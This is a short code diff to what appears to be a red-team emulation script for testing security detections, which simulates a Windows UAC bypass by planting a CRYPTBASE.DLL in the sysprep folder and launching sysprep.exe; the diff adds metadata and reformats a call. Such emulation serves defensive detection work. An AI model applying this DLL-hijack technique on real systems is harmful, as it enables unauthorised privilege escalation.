@@ -10,13 +10,20 @@
 
 
 from . import common
+from . import RtaMetadata
 
 
-@common.requires_os(common.WINDOWS)
+metadata = RtaMetadata(uuid="72e0a6ca-5b2d-48f6-9d6f-a879ace9cdae", platforms=["windows"], endpoint=[], siem=[], techniques=[])
+
+
+@common.requires_os(metadata.platforms)
 def main():
     common.log("Bypass UAC with CRYPTBASE.dll")
 
-    common.copy_file("C:\\windows\\system32\\kernel32.dll", "C:\\Windows\\system32\sysprep\\CRYPTBASE.DLL")
+    common.copy_file(
+        "C:\\windows\\system32\\kernel32.dll",
+        "C:\\Windows\\system32\sysprep\\CRYPTBASE.DLL",
+    )
     common.execute(["C:\\Windows\\system32\sysprep\\sysprep.exe"], timeout=5, kill=True)
     common.remove_file("C:\\Windows\\system32\sysprep\\CRYPTBASE.DLL")
 
